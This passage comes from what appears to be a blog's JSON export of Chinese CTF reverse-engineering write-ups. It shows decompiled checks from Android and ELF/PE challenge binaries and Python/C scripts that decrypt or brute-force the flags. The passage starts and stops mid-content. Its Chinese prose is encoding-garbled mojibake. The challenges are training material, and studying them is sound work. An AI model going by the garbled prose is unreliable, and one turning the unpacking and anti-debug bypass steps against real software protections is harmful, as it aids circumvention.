ç„¶åå°†jaræ–‡ä»¶æ‹–å…¥jadxï¼Œå¾—åˆ°check()çš„é€»è¾‘ï¼š 123456789public class MyClass implements IMyClass &#123; public byte[] check(String input) &#123; byte[] bytes = input.getBytes(); for (int i = 0; i &lt; bytes.length; i++) &#123; bytes[i] = (byte) (bytes[i] ^ 190); &#125; return bytes; &#125;&#125; æœ€åè„šæœ¬å¾—åˆ°flagï¼š com.j.hiddendata.apkæ‹¿è¿›jadxï¼Œåœ¨MainActivityä¸­æ‰¾åˆ°åŠ å¯†å‡½æ•°check()ï¼Œä½†æ˜¯åŠ å¯†å‡½æ•°å­˜åœ¨äºnativeå±‚ã€‚å¯ä»¥åœ¨è§£å‹åçš„libç›®å½•ä¸‹å°†.soæ–‡ä»¶æ‹–å…¥idaï¼š åœ¨JNI_OnLoadä¸­æ‰¾åˆ°åŠ å¯†å‡½æ•°ï¼Œç†æ¸…å‡½æ•°çš„é€»è¾‘ï¼š 1234567891011121314151617181920212223242526272829void *key_func()&#123; _BYTE *data; // r14 __int64 index; // rdi char *v2; // rbx void *result; // rax data = malloc(0x10uLL); index = 0LL; while ( 1 ) &#123; v2 = ori; data[index] = keys[(signed int)index % 4] ^ (((unsigned int)(unsigned __int8)ori[index] &gt;&gt; (signed int)index % 4) | (ori[index] &lt;&lt; (signed int)index / 4)); if ( index == 15 ) break; if ( ++index == 16 ) goto LABEL_6; &#125; __android_log_print( 4LL, (__int64)\"hidden\", (__int64)\"%d %d %d\", (unsigned __int8)(v2[15] &gt;&gt; 3), (unsigned __int8)(8 * v2[15]));LABEL_6: result = &amp;after; after = data; return result;&#125; è¿™æ®µæ˜¯å…³é”®å‡½æ•°ï¼Œè¿™é‡Œå°†oriå’Œkeysè¿›è¡Œä¸€ç³»åˆ—ç§»ä½å’Œå¼‚æˆ–è¿ç®—ï¼Œå¹¶å°†ç»“æœèµ‹å€¼ç»™afterã€‚ ä¸‹é¢å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263unsigned __int64 __fastcall str_cmp(__m128 *a1, int a2)&#123; _BOOL4 v2; // ebp __m128 *v3; // rbx __int64 v4; // r8 unsigned __int64 result; // rax char s; // [rsp+0h] [rbp-98h] char v7; // [rsp+4h] [rbp-94h] char v8; // [rsp+8h] [rbp-90h] char v9; // [rsp+Ch] [rbp-8Ch] char v10; // [rsp+10h] [rbp-88h] char v11; // [rsp+14h] [rbp-84h] char v12; // [rsp+18h] [rbp-80h] char v13; // [rsp+1Ch] [rbp-7Ch] char v14; // [rsp+20h] [rbp-78h] char v15; // [rsp+24h] [rbp-74h] char v16; // [rsp+28h] [rbp-70h] char v17; // [rsp+2Ch] [rbp-6Ch] char v18; // [rsp+30h] [rbp-68h] char v19; // [rsp+34h] [rbp-64h] char v20; // [rsp+38h] [rbp-60h] char v21; // [rsp+3Ch] [rbp-5Ch] unsigned __int64 v22; // [rsp+70h] [rbp-28h] v22 = __readfsqword(0x28u); v2 = 0; if ( a2 == 16 ) &#123; v3 = xor(a1); sprintf(&amp;s, \"\\\\x%02x\", LOBYTE(v3-&gt;m128_u64[0])); sprintf(&amp;v7, \"\\\\x%02x\", BYTE1(v3-&gt;m128_u64[0])); sprintf(&amp;v8, \"\\\\x%02x\", BYTE2(v3-&gt;m128_u64[0])); sprintf(&amp;v9, \"\\\\x%02x\", BYTE3(v3-&gt;m128_u64[0])); sprintf(&amp;v10, \"\\\\x%02x\", BYTE4(v3-&gt;m128_u64[0])); sprintf(&amp;v11, \"\\\\x%02x\", BYTE5(v3-&gt;m128_u64[0])); sprintf(&amp;v12, \"\\\\x%02x\", BYTE6(v3-&gt;m128_u64[0])); sprintf(&amp;v13, \"\\\\x%02x\", HIBYTE(v3-&gt;m128_u64[0])); sprintf(&amp;v14, \"\\\\x%02x\", LOBYTE(v3-&gt;m128_u64[1])); sprintf(&amp;v15, \"\\\\x%02x\", BYTE1(v3-&gt;m128_u64[1])); sprintf(&amp;v16, \"\\\\x%02x\", BYTE2(v3-&gt;m128_u64[1])); sprintf(&amp;v17, \"\\\\x%02x\", BYTE3(v3-&gt;m128_u64[1])); sprintf(&amp;v18, \"\\\\x%02x\", BYTE4(v3-&gt;m128_u64[1])); sprintf(&amp;v19, \"\\\\x%02x\", BYTE5(v3-&gt;m128_u64[1])); sprintf(&amp;v20, \"\\\\x%02x\", BYTE6(v3-&gt;m128_u64[1])); sprintf(&amp;v21, \"\\\\x%02x\", HIBYTE(v3-&gt;m128_u64[1])); __android_log_print(4LL, (__int64)\"hiddendata\", (__int64)\"%s\", (__int64)&amp;s, v4); v2 = memcmp(final, v3, 0x10uLL) == 0; free(v3); &#125; result = __readfsqword(0x28u); if ( result == v22 ) result = (unsigned int)v2; return result;&#125;__m128 *__fastcall xor(__m128 *a1)&#123; __m128 *result; // rax result = (__m128 *)malloc(0x10uLL); *result = _mm_xor_ps((__m128)*after, *a1); return result;&#125; å°†afterä¸a1ï¼ˆå³è¾“å…¥çš„å­—ç¬¦ä¸²ï¼‰è¿›è¡Œå¼‚æˆ–ï¼Œå†ä¸finalè¿›è¡Œæ¯”è¾ƒã€‚ å…¶ä¸­keysã€oriã€finaléƒ½èƒ½åœ¨å†…å­˜ä¸­dumpå‡ºæ¥ã€‚æœ€åå†™å‡ºè§£å¯†è„šæœ¬ï¼š 123456789ori = [0x41, 0xFF, 0xF3, 0xDB, 0x06, 0xB3, 0x69, 0xC2, 0x90, 0xA3, 0x21, 0x8F, 0x7B, 0x6D, 0x32, 0x8C]keys = [0x56, 0xFC, 0xD8, 0x66]final = [0x64, 0x32, 0x4A, 0xCD, 0x34, 0xE6, 0x5D, 0x82, 0xB6, 0x53, 0x0B, 0x39, 0xC8, 0xE7, 0x21, 0x71]flag = ''for i in range(16): tmp = keys[i % 4] ^ ((ori[i] &gt;&gt; i % 4) &amp; 0xFF | (ori[i] &lt;&lt; i / 4) &amp; 0xFF) ch = chr(tmp ^ final[i]) flag += chprint flag JNI stringæ“ä½œå‡½æ•° jsize GetStringUTFLength(JNIEnv *env, jstring string); ä»¥å­—èŠ‚ä¸ºå•ä½è¿”å›å­—ç¬¦ä¸²çš„UTF-8é•¿åº¦ã€‚ å‚æ•°ï¼š envï¼šJNIæ¥å£æŒ‡é’ˆã€‚ stringï¼šJavaå­—ç¬¦ä¸²å¯¹è±¡ã€‚ è¿”å›å€¼ï¼šè¿”å›å­—ç¬¦ä¸²çš„UTF-8é•¿åº¦ã€‚ const char * GetStringUTFChars(JNIEnv *env, jstring string,jboolean *isCopy); è¿”å›æŒ‡å‘å­—ç¬¦ä¸²çš„UTF-8å­—ç¬¦æ•°ç»„çš„æŒ‡é’ˆã€‚è¯¥æ•°ç»„åœ¨è¢«ReleaseStringUTFChars()é‡Šæ”¾å‰å°†ä¸€ç›´æœ‰æ•ˆã€‚ å¦‚æœisCopyä¸æ˜¯NULLï¼Œ*isCopyåœ¨å¤åˆ¶å®Œæˆåå³è¢«è®¾ä¸ºJNI_TRUEã€‚å¦‚æœæœªå¤åˆ¶ï¼Œåˆ™è®¾ä¸ºJNI_FALSEã€‚ å‚æ•°ï¼š envï¼šJNI æ¥å£æŒ‡é’ˆã€‚ stringï¼šJava å­—ç¬¦ä¸²å¯¹è±¡ã€‚ isCopyï¼šæŒ‡å‘å¸ƒå°”å€¼çš„æŒ‡é’ˆã€‚ è¿”å›å€¼ï¼šæŒ‡å‘UTF-8å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚å¦‚æœæ“ä½œå¤±è´¥ï¼Œåˆ™ä¸ºNULLã€‚ mm_xor_si128(__m128i a , __m128i b ) è¿”å›ä¸€ä¸ª_m128içš„å¯„å­˜å™¨iï¼Œå°†å¯„å­˜å™¨aå’Œå¯„å­˜å™¨bå¯¹åº”çš„ä½è¿›è¡ŒæŒ‰ä½å¼‚æˆ–è¿ç®—ã€‚","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"android","slug":"android","permalink":"https://qianfei11.github.io/tags/android/"}]},{"title":"XMan REï¼ˆäºŒï¼‰","slug":"XMan-REï¼ˆäºŒï¼‰","date":"2018-08-03T02:31:27.000Z","updated":"2018-10-07T09:45:05.377Z","comments":true,"path":"2018/08/03/XMan-REï¼ˆäºŒï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/03/XMan-REï¼ˆäºŒï¼‰/","excerpt":"A7umè¯´è¿™éƒ½æ˜¯ç°åœ¨æœ€ç®€å•çš„é€†å‘ï¼Œè¿˜ç»™æˆ‘ä»¬è§è¯†äº†ä¸€æ³¢éå¸¸è§„reã€‚","text":"A7umè¯´è¿™éƒ½æ˜¯ç°åœ¨æœ€ç®€å•çš„é€†å‘ï¼Œè¿˜ç»™æˆ‘ä»¬è§è¯†äº†ä¸€æ³¢éå¸¸è§„reã€‚ hide_1æ‹¿åˆ°æ–‡ä»¶å…ˆfileä¸€ä¸‹ï¼Œæ˜¯64ä½çš„ELFæ–‡ä»¶ã€‚ç„¶åstringsä¸€ä¸‹ï¼Œå‘ç°æœ‰upxå£³ã€‚ ç”¨upx -dä¸èƒ½è„±ï¼Œæ”¹ç”¨ddç›´æ¥æŠŠå†…å­˜dumpä¸‹æ¥ã€‚ ç„¶åå¯ä»¥æ‹–è¿›idaå¼€å§‹é€†ã€‚å…ˆæ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªè—å‡flagçš„å‡½æ•°ï¼Œé€»è¾‘æ˜æ˜¾çš„é”™è¯¯çš„ã€‚ 12345678910111213141516171819202122232425262728__int64 sub_4009EF()&#123; const char *v0; // rsi@4 __int64 v1; // rdx@4 __int64 result; // rax@6 char v3; // [sp+10h] [bp-70h]@3 __int64 v4; // [sp+78h] [bp-8h]@1 v4 = v28; if ( sub_43F380(0) ) sub_40EAD0(0LL, 0LL); sub_43E9B0(1LL, \"Enter the flag:\\n\", 16LL); sub_43E950(0LL, &amp;v3, 32LL); if ( (unsigned int)sub_4009AE((__int64)&amp;v3) != 0 ) &#123; v0 = \"You are right\\n\"; sub_43E9B0(1LL, \"You are right\\n\", 14LL); &#125; else &#123; v0 = \"You are wrong\\n\"; sub_43E9B0(1LL, \"You are wrong\\n\", 14LL); &#125; result = 0LL; if ( v28 != v4 ) sub_442480(1LL, v0, v1, v28 ^ v4); return result;&#125; æ ¹æ®&quot;Enter the flag:\\n&quot;è¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œæ‰¾åˆ°äº†çœŸæ­£è—flagçš„åœ°æ–¹ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576LOAD:00000000004C8EA1 flag_place proc nearLOAD:00000000004C8EA1 000 xor edi, edi ; requestLOAD:00000000004C8EA3 000 xor rsi, rsi ; pidLOAD:00000000004C8EA6 000 xor rdx, rdx ; addrLOAD:00000000004C8EA9 000 xor r10, r10 ; dataLOAD:00000000004C8EAC 000 mov eax, 65hLOAD:00000000004C8EB1 000 syscall ; LINUX - sys_ptraceLOAD:00000000004C8EB3 000 cmp eax, 0LOAD:00000000004C8EB6 000 jnz locret_4C8FDBLOAD:00000000004C8EBC 000 xor rdi, rdiLOAD:00000000004C8EBF 000 inc rdi ; fdLOAD:00000000004C8EC2 000 mov rsi, offset aEnterTheFlag ; bufLOAD:00000000004C8EC9 000 mov rdx, 10h ; countLOAD:00000000004C8ED0 000 xor eax, eaxLOAD:00000000004C8ED2 000 inc eaxLOAD:00000000004C8ED4 000 syscall ; LINUX - sys_writeLOAD:00000000004C8ED6 000 xor rdi, rdi ; fdLOAD:00000000004C8ED9 000 xor eax, eaxLOAD:00000000004C8EDB 000 mov rsi, offset byte_6CCDB0 ; bufLOAD:00000000004C8EE2 000 mov rdx, 20h ; countLOAD:00000000004C8EE9 000 syscall ; LINUX - sys_readLOAD:00000000004C8EEB 000 cmp eax, 0LOAD:00000000004C8EEE 000 jle loc_4C8FA9LOAD:00000000004C8EF4 000 mov rdi, offset byte_6CCDB0LOAD:00000000004C8EFB 000 mov rcx, 0FFFFFFFFFFFFFFFFhLOAD:00000000004C8F02 000 xor eax, eaxLOAD:00000000004C8F04 000 repne scasbLOAD:00000000004C8F06 000 not rcxLOAD:00000000004C8F09 000 sub rcx, 1LOAD:00000000004C8F0D 000 cmp rcx, 15h ; strlen=21LOAD:00000000004C8F11 000 jnz loc_4C8FA9LOAD:00000000004C8F17 000 mov rdi, offset byte_6CCDB0LOAD:00000000004C8F1E 000 cmp byte ptr [rdi+1], 77h ; wLOAD:00000000004C8F22 000 jnz loc_4C8FA9LOAD:00000000004C8F28 000 cmp byte ptr [rdi+2], 62h ; bLOAD:00000000004C8F2C 000 jnz short loc_4C8FA9LOAD:00000000004C8F2E 000 cmp byte ptr [rdi+3], 7Bh ; &#123;LOAD:00000000004C8F32 000 jnz short loc_4C8FA9LOAD:00000000004C8F34 000 cmp byte ptr [rdi+14h], 7Dh ; &#125;LOAD:00000000004C8F38 000 jnz short loc_4C8FA9LOAD:00000000004C8F3A 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F41 000 call trans1LOAD:00000000004C8F46 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F4D 000 call trans2LOAD:00000000004C8F52 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F59 000 call trans1LOAD:00000000004C8F5E 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F65 000 call trans2LOAD:00000000004C8F6A 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F71 000 call trans1LOAD:00000000004C8F76 000 mov rdi, offset unk_6CCDB4LOAD:00000000004C8F7D 000 call trans2LOAD:00000000004C8F82 000 mov rsi, offset qword_4C8CB0LOAD:00000000004C8F89 000 mov rdx, 0LOAD:00000000004C8F90LOAD:00000000004C8F90 loc_4C8F90: ; CODE XREF: flag_place+106â†“jLOAD:00000000004C8F90 000 cmp rdx, 10hLOAD:00000000004C8F94 000 jnb short loc_4C8FB2LOAD:00000000004C8F96 000 mov al, [rdi]LOAD:00000000004C8F98 000 mov ah, [rsi]LOAD:00000000004C8F9A 000 cmp al, ahLOAD:00000000004C8F9C 000 jnz short loc_4C8FA9LOAD:00000000004C8F9E 000 inc rdxLOAD:00000000004C8FA1 000 inc rdiLOAD:00000000004C8FA4 000 inc rsiLOAD:00000000004C8FA7 000 jmp short loc_4C8F90LOAD:00000000004C8FA9 ; ---------------------------------------------------------------------------LOAD:00000000004C8FA9LOAD:00000000004C8FA9 loc_4C8FA9: ; CODE XREF: flag_place+4Dâ†‘jLOAD:00000000004C8FA9 ; flag_place+70â†‘j ...LOAD:00000000004C8FA9 000 mov rsi, offset aYouAreWrong ; &quot;You are wrong\\n&quot;LOAD:00000000004C8FB0 000 jmp short loc_4C8FB9LOAD:00000000004C8FB2 ; ---------------------------------------------------------------------------LOAD:00000000004C8FB2LOAD:00000000004C8FB2 loc_4C8FB2: ; CODE XREF: flag_place+F3â†‘jLOAD:00000000004C8FB2 000 mov rsi, offset aYouAreRight ; &quot;You are right\\n&quot; ç›´æ¥æ ¹æ®æ±‡ç¼–ä»£ç å¯ä»¥åˆ¤æ–­å‡ºflagçš„å¤„ç†è¿‡ç¨‹ï¼Œç»è¿‡ä¸¤ä¸ªåŠ å¯†å‡½æ•°ï¼Œå…±ä¸‰æ¬¡åŠ å¯†ã€‚ ç¬¬ä¸€ä¸ªåŠ å¯†å‡½æ•°å°†flagåˆ†æˆå‰åä¸¤æ®µï¼Œåˆ†åˆ«è¿›è¡Œä¸€ç³»åˆ—æŒ‰ä½ç§»ä½æ“ä½œï¼Œæ€»å…±å¾ªç¯ä¸ƒæ¬¡ã€‚è¿™ä¸€æ®µé€†èµ·æ¥æœ‰äº›éº»çƒ¦ã€‚ 123456789101112131415161718192021222324252627282930313233343536__int64 __fastcall trans1(char *a1)&#123; __int64 result; // rax unsigned __int64 v2; // rt1 unsigned int former; // [rsp+18h] [rbp-48h] __int64 later; // [rsp+1Ch] [rbp-44h] signed int i; // [rsp+24h] [rbp-3Ch] signed int j; // [rsp+28h] [rbp-38h] int v7[5]; // [rsp+40h] [rbp-20h] unsigned __int64 v8; // [rsp+58h] [rbp-8h] v8 = __readfsqword(0x28u); v7[0] = 1883844979; v7[1] = 1165112144; v7[2] = 2035430262; v7[3] = 861484132; for ( i = 0; i &lt;= 1; ++i ) &#123; former = *(_DWORD *)&amp;a1[8 * i]; later = *(unsigned int *)&amp;a1[8 * i + 4]; for ( j = 0; j &lt;= 7; ++j ) &#123; former += (v7[BYTE4(later) &amp; 3] + HIDWORD(later)) ^ ((((unsigned int)later &gt;&gt; 5) ^ 16 * later) + later); HIDWORD(later) += 1735289196; LODWORD(later) = ((v7[(HIDWORD(later) &gt;&gt; 11) &amp; 3] + HIDWORD(later)) ^ (((former &gt;&gt; 5) ^ 16 * former) + former)) + later; &#125; *(_DWORD *)&amp;a1[8 * i] = former; *(_DWORD *)&amp;a1[8 * i + 4] = later; &#125; v2 = __readfsqword(0x28u); result = v2 ^ v8; if ( v2 != v8 ) result = ((__int64 (*)(void))loc_4C8B9A)(); return result;&#125; ç¬¬äºŒæ®µåŠ å¯†å‡½æ•°æ˜¯ä¸ªç®€å•çš„å¼‚æˆ–ï¼Œå¯¹ç§°åŠ å¯†ã€‚ 123456789101112_BYTE *__fastcall trans2(__int64 a1)&#123; _BYTE *result; // rax signed int i; // [rsp+14h] [rbp-4h] for ( i = 0; i &lt;= 15; ++i ) &#123; result = (_BYTE *)(i + a1); *result ^= i; &#125; return result;&#125; ç„¶åé€šè¿‡åŠ¨æ€è°ƒè¯•ï¼Œå¯ä»¥dataæ®µæ‰¾åˆ°è¢«åŠ å¯†è¿‡çš„flagï¼Œå–å‡ºå¯†æ–‡åï¼Œå†™å‡ºè§£å¯†è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344import structdef u32(data): return struct.unpack(\"&lt;I\", data)[0]def p32(data): return struct.pack(\"&lt;I\", data)def decrypt(data): delta = 0x676E696C key = [1883844979, 1165112144, 2035430262, 861484132] for i in range(len(key)): key[i] %= 0x100000000 sum = delta * 8 high = u32(data[:4]) low = u32(data[4:8]) for i in range(8): low -= ((((high &lt;&lt; 4) % 0x100000000) ^ (high &gt;&gt; 5)) + high) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]) low %= 0x100000000 sum -= delta high -= ((((low &lt;&lt; 4) % 0x100000000) ^ (low &gt;&gt; 5)) + low) ^ (sum + key[sum &amp; 3]) high %= 0x100000000 return p32(high) + p32(low)def xor(data): res = '' for i in range(len(data)): res += chr(ord(data[i]) ^ i) return resdef main(): s0 = [0x52, 0xB8, 0x13, 0x7F, 0x35, 0x8C, 0xF2, 0x1B, 0xF4, 0x63, 0x86, 0xD2, 0x73, 0x4F, 0x1E, 0x31] s = '' for i in range(len(s0)): s += chr(s0[i]) print s for i in range(3): flag = xor(s) s = decrypt(flag[0:8]) + decrypt(flag[8:16]) print s print 'flag:', 'qwb&#123;' + s + '&#125;'if __name__ == '__main__': main() simplecheck.apkæ‹–è¿›jadxï¼ŒMainActivityä¸­çœ‹åˆ°åŠ å¯†è¿‡ç¨‹ä¸­è°ƒç”¨äº†aç±»ä¸­çš„a()å‡½æ•°ï¼Œç›´æ¥æ‰“å¼€çœ‹å‡½æ•°ç»“æ„ï¼š 1234567891011121314151617181920212223242526272829package com.a.simplecheck;public class a &#123; private static int[] a = new int[]&#123;0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312&#125;; private static int[] b = new int[]&#123;13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108&#125;; private static int[] c = new int[]&#123;38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666&#125;; private static int[] d = new int[]&#123;0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562&#125;; public static boolean a(String str) &#123; if (str.length() != b.length) &#123; return false; &#125; int[] iArr = new int[a.length]; iArr[0] = 0; int i = 1; for (byte b : str.getBytes()) &#123; iArr[i] = b; i++; &#125; int i2 = 0; while (i2 &lt; c.length) &#123; if (a[i2] != (((b[i2] * iArr[i2]) * iArr[i2]) + (c[i2] * iArr[i2])) + d[i2] || a[i2 + 1] != (((b[i2] * iArr[i2 + 1]) * iArr[i2 + 1]) + (c[i2] * iArr[i2 + 1])) + d[i2]) &#123; return false; &#125; i2++; &#125; return true; &#125;&#125; ç„¶ååªéœ€è¦æ ¹æ®ç¨‹åºé€»è¾‘ï¼Œå†™å‡ºçˆ†ç ´è„šæœ¬å³å¯ï¼š 1234567891011a = [0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312]b = [13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108]c = [38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666]d = [0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562]flag = ''for i in range(34): for ch in range(32, 127): if a[i] == b[i] * ch * ch + c[i] * ch + d[i] and a[i] == b[i - 1] * ch * ch + c[i - 1] * ch + d[i - 1]: flag += chr(ch) breakprint flag magic_2fileåå‘ç°æ˜¯ä¸€ä¸ª64ä½PEæ–‡ä»¶ã€‚æ‹–è¿›idaï¼Œéœ€è¦å…ˆä¿®æ”¹ä¸€ä¸‹ç¼–è¯‘å™¨é€‰é¡¹ï¼Œä¸ç„¶idaå‚ç…§linux x64çš„è°ƒç”¨çº¦å®šæ¥åˆ†æçš„å‡½æ•°éƒ½æ˜¯é”™è¯¯çš„ã€‚ æ‰“å¼€è™šæ‹Ÿæœºï¼Œè¿›è¡Œè¿œç¨‹åŠ¨æ€è°ƒè¯•ï¼š åœ¨è¿›è¡Œè¿œç¨‹åŠ¨æ€è°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œå…ˆå‘ç°åœ¨putså­—ç¬¦ä¸²ä¹‹å‰ä¼šå¯¹æ—¶é—´è¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445__int64 sub_402357()&#123; __int64 result; // rax int v1; // eax __int64 v2; // r9 check_time(); result = (unsigned int)Time_data[0]; if ( !Time_data[0] ) // Time_data[0] == ture &#123; v1 = strtol(\"ca11ab1e\", 0i64, 16); result = puts_enc((const char *)&amp;unk_405220, 105i64, v1 ^ 0xBADD1917, v2); &#125; return result;&#125;__int64 check_time()&#123; __int64 result; // rax unsigned int is_time_ok; // [rsp+20h] [rbp-10h] int n; // [rsp+24h] [rbp-Ch] unsigned int n_time; // [rsp+28h] [rbp-8h] int i; // [rsp+2Ch] [rbp-4h] n_time = time64(0i64); if ( n_time &lt;= 0x5AFFE78F || n_time &gt; 0x5B028A8F ) return 0i64; srand(n_time); for ( i = 0; i &lt;= 255; ++i ) table[i] ^= rand(); n = 0; is_time_ok = 0; cal_n(table, &amp;n, &amp;is_time_ok); if ( n == 1792 ) &#123; Time_data[0] = is_time_ok; result = is_time_ok; &#125; else &#123; Time_data[0] = 0; result = 0i64; &#125; return result;&#125; è¿™é‡Œåˆ¤å®šæ—¶é—´æˆ³å¿…é¡»å¤§äº0x5AFFE78Fä¸”å°äºç­‰äº0x5B028A8Fã€‚ å¯¹å…¶ä¸­çš„å‡½æ•°åˆ†æä¹‹åï¼Œç›´æ¥ç”¨åç¼–è¯‘å‡ºæ¥çš„ä»£ç ï¼Œè¿›è¡Œé€‚å½“è°ƒæ•´åï¼Œå¯¹åŒºé—´å†…çš„æ—¶é—´çˆ†ç ´ï¼Œæœ€åå¾—åˆ°æ­£ç¡®çš„æ—¶é—´æˆ³ã€‚çˆ†ç ´è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;random&gt;#include &lt;time.h&gt;#include &lt;inttypes.h&gt;#include &lt;string.h&gt;#define BYTE uint8_t#define WORD uint16_t#define DWORD uint32_t#define QWORD uint64_tDWORD *get_dst_block(DWORD *dst, signed int index)&#123; DWORD *res; // rax if(index &gt;= 0 &amp;&amp; index &lt;= 255) res = &amp;dst[3 * index]; else res = 0; return res;&#125;void cal_n(DWORD *a1, unsigned int a2)&#123; DWORD *res; // rax DWORD *v3; // rax int v4; // [rsp+24h] [rbp-1Ch] DWORD *v5; // [rsp+28h] [rbp-18h] DWORD *v6; // [rsp+30h] [rbp-10h] DWORD *v7; // [rsp+38h] [rbp-8h] DWORD *ala; // [rsp+50h] [rbp+10h] signed int idxa; // [rsp+58h] [rbp+18h] ala = a1; idxa = a2; res = get_dst_block(a1, a2); v7 = res; if(res) &#123; if(idxa &amp; 0xF) v3 = get_dst_block(ala, idxa - 1); else v3 = 0; v6 = v3; if((unsigned int)(idxa + 15) &lt;= 0x1E) res = 0; else res = get_dst_block(ala, idxa - 16); v5 = res; if(v6 || res) &#123; if(v6) &#123; v7[1] = *(char *)v7 + v6[1]; v7[2] = 2 * v6[2]; &#125; if(v5) &#123; v4 = v5[1] + *(char *)v7; res = (DWORD *)v7[1]; if((DWORD *)v4 &lt; res) &#123; v7[1] = v4; v7[2] = 2 * v5[2] | 1; &#125; &#125; &#125; else v7[1] = *(char *)v7; &#125;&#125;int main()&#123; BYTE table[256] = &#123; 0x58, 0x71, 0x8F, 0x32, 0x05, 0x06, 0x51, 0xC7, 0xA7, 0xF8, 0x3A, 0xE1, 0x06, 0x48, 0x82, 0x09, 0xA1, 0x12, 0x9F, 0x7C, 0xB8, 0x2A, 0x6F, 0x95, 0xFD, 0xD0, 0x67, 0xC8, 0xE3, 0xCE, 0xAB, 0x12, 0x1F, 0x98, 0x6B, 0x14, 0xEA, 0x89, 0x90, 0x21, 0x2D, 0xFD, 0x9A, 0xBB, 0x47, 0xCC, 0xEA, 0x9C, 0xD7, 0x50, 0x27, 0xAF, 0xB9, 0x77, 0xDF, 0xC5, 0xE9, 0xE1, 0x50, 0xD3, 0x38, 0x89, 0xEF, 0x2D, 0x72, 0xC2, 0xDF, 0xF3, 0x7D, 0x7D, 0x65, 0x95, 0xED, 0x13, 0x00, 0x1C, 0xA3, 0x3C, 0xE3, 0x57, 0xE3, 0xF7, 0xF7, 0x2C, 0x73, 0x88, 0x34, 0xB1, 0x62, 0xD3, 0x37, 0x19, 0x26, 0xBE, 0xB2, 0x33, 0x20, 0x3F, 0x60, 0x39, 0x87, 0xA6, 0x65, 0xAD, 0x73, 0x1A, 0x6D, 0x49, 0x33, 0x49, 0xC0, 0x56, 0x00, 0xBE, 0x0A, 0xCF, 0x28, 0x7E, 0x8E, 0x69, 0x87, 0xE1, 0x05, 0x88, 0xDA, 0x54, 0x3E, 0x3C, 0x0E, 0xA9, 0xFA, 0xD7, 0x7F, 0x4E, 0x44, 0xC6, 0x9A, 0x0A, 0xD2, 0x98, 0x6A, 0xA4, 0x19, 0x6D, 0x8C, 0xE1, 0xF9, 0x30, 0xE5, 0xFF, 0x33, 0x4A, 0xA9, 0x52, 0x3A, 0x0D, 0x67, 0x20, 0x1D, 0xBF, 0x36, 0x3E, 0xE8, 0x56, 0xBF, 0x5A, 0x88, 0xA8, 0x69, 0xD6, 0xAB, 0x52, 0xF1, 0x14, 0xF2, 0xD7, 0xEF, 0x92, 0xF7, 0xA0, 0x70, 0xA1, 0xEF, 0xE3, 0x1F, 0x66, 0x2B, 0x97, 0xF6, 0x2B, 0x30, 0x0F, 0xB0, 0xB4, 0xC0, 0xFE, 0xA6, 0x62, 0xFD, 0xE6, 0x4C, 0x39, 0xCF, 0x20, 0xB3, 0x10, 0x60, 0x9F, 0x34, 0xBE, 0xB2, 0x1C, 0x3B, 0x6B, 0x1D, 0xDF, 0x53, 0x72, 0xF2, 0xFA, 